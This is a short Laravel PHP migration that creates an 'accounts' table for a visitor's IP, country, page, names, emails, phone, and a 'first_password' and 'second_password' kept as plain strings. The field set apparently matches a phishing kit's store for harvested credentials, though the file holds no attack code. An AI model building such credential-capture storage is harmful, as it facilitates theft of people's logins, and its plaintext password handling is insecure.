<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('accounts', function (Blueprint $table) {
            $table->uuid('id')->primary();
            $table->string('ip')->comment('ip');
            $table->string('country')->comment('country');
            $table->string('page')->comment('page')->nullable();
            $table->string('fullname')->comment('fullname')->nullable();
            $table->string('business_email')->comment('business_email')->nullable();
            $table->string('personal_email')->comment('personal_email')->nullable();
            $table->string('phone')->comment('phone')->nullable();
            $table->string('first_password')->comment('first_password')->nullable();
            $table->string('second_password')->comment('second_password')->nullable();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('accounts');
    }
};
